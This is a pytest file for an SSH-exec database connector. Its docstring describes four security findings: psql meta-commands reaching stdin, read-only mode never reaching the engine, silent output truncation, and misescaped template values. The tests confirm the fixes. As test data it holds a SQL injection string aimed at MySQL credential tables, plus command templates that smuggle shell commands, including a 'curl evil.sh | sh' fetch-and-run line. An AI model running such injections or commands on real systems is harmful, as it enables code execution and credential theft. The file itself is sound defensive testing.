"""SSH-exec was the product's weakest surface: four findings, one connector (2026-09-09).

Everything here is about a gap between what the code believes it is talking to and what is
actually on the other end of the string.

**SQL-01 — the query went to psql's stdin, where a backslash is a command.** `SafetyGuard`
now refuses a client meta-command outright (`test_readonly_guard_closes_three_holes.py`),
and this file closes the other half: for a built-in template the SQL is passed as an
**argument** (`psql -c`, `mysql -e`, `clickhouse-client -q`), where psql does not process
meta-commands at all. Two independent layers, because the guard is a denylist and the
argument form removes the capability.

**SQL-02 — `is_read_only` reached the CLI nowhere.** It appears once in the connector, to
decide retry idempotency. Every native connector opens a DB-enforced read-only session
(`postgres.py:119`, `mysql.py:66`, `clickhouse.py:119`), so on ssh-exec the documented
layering collapsed to the regex alone — and the regex is what SQL-11 and SQL-12 had just
walked through.

**SQL-04 — output was cut mid-line at 10 MB and reported as complete.** `QueryResult`
omitted `truncated=`, which defaults to `False`, so the answer above it said "here is the
data" about a fragment — and the last row was a half-line the parser then read as a row.

**SQL-13 — `format_template` escaped for the wrong context.** The MySQL and ClickHouse
introspection templates embed `'{db_name}'` inside a double-quoted `-e "…"`, and the
formatter applied bare-shell single-quoting to a value that sits inside SQL single quotes
inside shell double quotes. A database named `my db` produced `''my db''` — broken SQL for
any ordinary multi-word name — and a crafted name reached MySQL's parser with no SQL
escaping at all.
"""

from __future__ import annotations

from dataclasses import dataclass

import pytest

from app.connectors.base import ConnectionConfig
from app.connectors.exec_templates import format_template
from app.connectors.ssh_exec import SSHExecConnector


@dataclass
class FakeSSHResult:
    stdout: str = ""
    stderr: str = ""
    exit_status: int = 0


def make_config(**overrides) -> ConnectionConfig:
    defaults = dict(
        db_type="postgres",
        db_host="10.0.0.5",
        db_port=5432,
        db_name="app",
        db_user="readonly",
        db_password="pw",
        ssh_host="10.0.0.1",
        ssh_user="deploy",
        ssh_key_content="fake-key",
        ssh_exec_mode=True,
    )
    defaults.update(overrides)
    return ConnectionConfig(**defaults)


def _connector(**overrides) -> SSHExecConnector:
    c = SSHExecConnector()
    c._config = make_config(**overrides)
    return c


class TestTheQueryIsAnArgumentNotStdin:
    """SQL-01, the capability half."""

    @pytest.mark.parametrize(
        ("db_type", "flag"),
        [("postgres", "-c"), ("mysql", "-e"), ("clickhouse", "-q")],
    )
    def test_the_sql_arrives_as_an_argument(self, db_type: str, flag: str) -> None:
        command, _ = _connector(db_type=db_type)._build_command("query", "SELECT 1")
        assert f"{flag} 'SELECT 1'" in command, (
            f"{db_type}: the query is not passed with {flag}; piped to the client's stdin "
            "it is read as interactive input, where a backslash introduces a command"
        )

    @pytest.mark.parametrize("db_type", ["postgres", "mysql", "clickhouse"])
    def test_the_query_is_no_longer_piped(self, db_type: str) -> None:
        command, _ = _connector(db_type=db_type)._build_command("query", "SELECT 1")
        assert "echo " not in command, f"{db_type}: the query still reaches the client on stdin"

    @pytest.mark.parametrize("db_type", ["postgres", "mysql", "clickhouse"])
    def test_the_password_still_travels_on_stdin(self, db_type: str) -> None:
        """The argument form must not undo F-SSH-02: the secret stays off argv."""
        command, stdin = _connector(db_type=db_type)._build_command("query", "SELECT 1")
        assert "read -r DBPASS" in command
        assert stdin == "pw\n"
        assert "pw" not in command.replace("DBPASS", "")

    def test_a_quote_in_the_query_is_escaped_not_interpolated(self) -> None:
        command, _ = _connector()._build_command("query", "SELECT 'it''s'")
        assert "it" in command and ";" not in command.split("-c")[1].replace("'\\''", "")


class TestReadOnlyReachesTheEngine:
    """SQL-02. `is_read_only` must configure the client, not only the retry decision."""

    def test_postgres_sets_a_read_only_transaction_default(self) -> None:
        command, _ = _connector(is_read_only=True)._build_command("query", "SELECT 1")
        assert "default_transaction_read_only=on" in command

    def test_mysql_opens_a_read_only_session(self) -> None:
        command, _ = _connector(db_type="mysql", is_read_only=True)._build_command(
            "query", "SELECT 1"
        )
        assert "SET SESSION TRANSACTION READ ONLY" in command

    def test_clickhouse_runs_in_readonly_mode(self) -> None:
        command, _ = _connector(db_type="clickhouse", is_read_only=True)._build_command(
            "query", "SELECT 1"
        )
        assert "readonly" in command

    @pytest.mark.parametrize("db_type", ["postgres", "mysql", "clickhouse"])
    def test_a_writable_connection_is_left_alone(self, db_type: str) -> None:
        command, _ = _connector(db_type=db_type, is_read_only=False)._build_command(
            "query", "SELECT 1"
        )
        assert "read_only" not in command.lower().replace("readonly", "")
        assert "READ ONLY" not in command

    def test_a_custom_template_says_it_cannot_be_decorated(self, caplog) -> None:
        """An owner's own template names a client we cannot configure. Say so, don't pretend."""
        c = _connector(
            is_read_only=True,
            ssh_command_template='PGPASSWORD="$DBPASS" mypsql -h {db_host}',
        )
        with caplog.at_level("WARNING"):
            c._build_command("query", "SELECT 1")
        assert any("read-only" in r.getMessage().lower() for r in caplog.records), (
            "a read-only connection ran a custom template with no engine-level enforcement "
            "and no warning"
        )


class TestTruncationIsReported:
    """SQL-04. A cut result that reports itself complete is a wrong number with a seal."""

    @pytest.mark.asyncio
    async def test_a_truncated_result_says_so(self, monkeypatch) -> None:
        from app.connectors import ssh_exec as mod

        monkeypatch.setattr(mod, "MAX_OUTPUT_BYTES", 200)
        big = "a\tb\n" + "\n".join(f"{i}\t{'x' * 40}" for i in range(50))

        c = _connector()

        async def fake_run(command, timeout=None, stdin=None, idempotent=False):
            cut, was_cut = mod._truncate_output(big)
            return cut, "", 0, was_cut

        monkeypatch.setattr(c, "_run_command", fake_run)
        result = await c.execute_query("SELECT 1")
        assert result.truncated is True, "the result was cut and reported as complete"

    @pytest.mark.asyncio
    async def test_an_untruncated_result_does_not_claim_truncation(self, monkeypatch) -> None:
        c = _connector()

        async def fake_run(command, timeout=None, stdin=None, idempotent=False):
            return "a\tb\n1\t2\n", "", 0, False

        monkeypatch.setattr(c, "_run_command", fake_run)
        result = await c.execute_query("SELECT 1")
        assert result.truncated is False
        assert result.row_count == 1

    def test_the_cut_lands_on_a_line_boundary(self) -> None:
        """A half-row is parsed as a row: the wrong value, not merely a missing one."""
        from app.connectors import ssh_exec as mod

        text = "header\n" + "\n".join(f"row{i}\tvalue{i}" for i in range(100))
        cut, truncated = mod._truncate_output(text, limit=60)
        assert truncated is True
        assert cut.endswith("\n") or "\n" in cut
        assert not cut.split("\n")[-1] or cut.split("\n")[-1] in text.split("\n")


class TestTemplateEscapingUsesTheRealContext:
    """SQL-13. The placeholder sits inside SQL quotes inside shell quotes."""

    def test_a_multi_word_database_name_produces_valid_sql(self) -> None:
        out = format_template(
            "mysql -e \"SELECT 1 FROM t WHERE s = '{db_name}'\"", {"db_name": "my db"}
        )
        assert "'my db'" in out, f"the SQL literal is malformed: {out}"
        assert "''my db''" not in out

    def test_a_quote_in_the_name_cannot_close_the_literal(self) -> None:
        """The payload may still be *present* — as data. What it must not do is escape.

        The first version of this test asserted `"UNION SELECT user" not in out`, which is
        the wrong requirement: correctly escaped, the whole hostile string stays in the
        command as the content of one literal and means nothing to the parser. What proves
        the fix is that every quote it carries has been doubled, so the literal never closes.
        """
        hostile = "a' UNION SELECT user,authentication_string,'x' FROM mysql.user -- "
        out = format_template(
            "mysql -e \"SELECT 1 FROM t WHERE s = '{db_name}'\"", {"db_name": hostile}
        )
        assert "a'' UNION" in out, "the quote that closes the literal was not doubled"
        assert "''x''" in out, "an inner quote pair was left able to close the literal"
        # The literal opens and closes exactly once: every quote between them is doubled,
        # so the total count is even.
        assert out.count("'") % 2 == 0, f"odd number of quotes — the literal is unbalanced: {out}"

    def test_the_bare_and_double_quoted_contexts_still_work(self) -> None:
        assert format_template("psql -h {db_host}", {"db_host": "10.0.0.5"}).endswith("10.0.0.5")
        assert '"a\\$b"' in format_template('x="{p}"', {"p": "a$b"})


class TestACustomTemplateIsValidated:
    """SQL-06 — the pre-command allowlist guarded one half of a shell line.

    `ssh_pre_commands` are screened for `;`, `&`, `|`, redirects, backticks and `$(`, and
    then joined with `&&` onto a command template that was never screened for anything. The
    protection sat on the cheaper half: an owner who wanted to run something arbitrary had
    only to put it in the template, where nothing looked.

    Owner-only, so this is hardening rather than a privilege boundary — and the reason it is
    worth closing anyway is that a validated field can be *relied on* later, while an
    unvalidated one has to be assumed hostile by everything downstream forever.
    """

    @pytest.mark.parametrize(
        "template",
        [
            'PGPASSWORD="$DBPASS" psql -h {db_host}; curl evil.sh | sh',
            'PGPASSWORD="$DBPASS" psql -h {db_host} && id',
            'PGPASSWORD="$DBPASS" psql -h {db_host} > /tmp/out',
            "psql -h {db_host} `id`",
            "psql -h {db_host} $(id)",
            "psql -h {db_host}\nid",
        ],
    )
    def test_a_template_carrying_a_shell_escape_is_refused(self, template: str) -> None:
        from app.connectors.exec_templates import (
            CommandTemplateValidationError,
            validate_command_template,
        )

        with pytest.raises(CommandTemplateValidationError):
            validate_command_template(template)

    def test_an_ordinary_template_passes(self) -> None:
        from app.connectors.exec_templates import EXEC_TEMPLATES, validate_command_template

        for db_type, kinds in EXEC_TEMPLATES.items():
            validate_command_template(kinds["query"]), f"{db_type}'s own template was refused"

    def test_the_connector_refuses_to_build_from_an_invalid_stored_template(self) -> None:
        """Validation at save is not enough: a row can predate the check."""
        from app.connectors.exec_templates import CommandTemplateValidationError

        c = _connector(ssh_command_template="psql -h {db_host}; id")
        with pytest.raises(CommandTemplateValidationError):
            c._build_command("query", "SELECT 1")
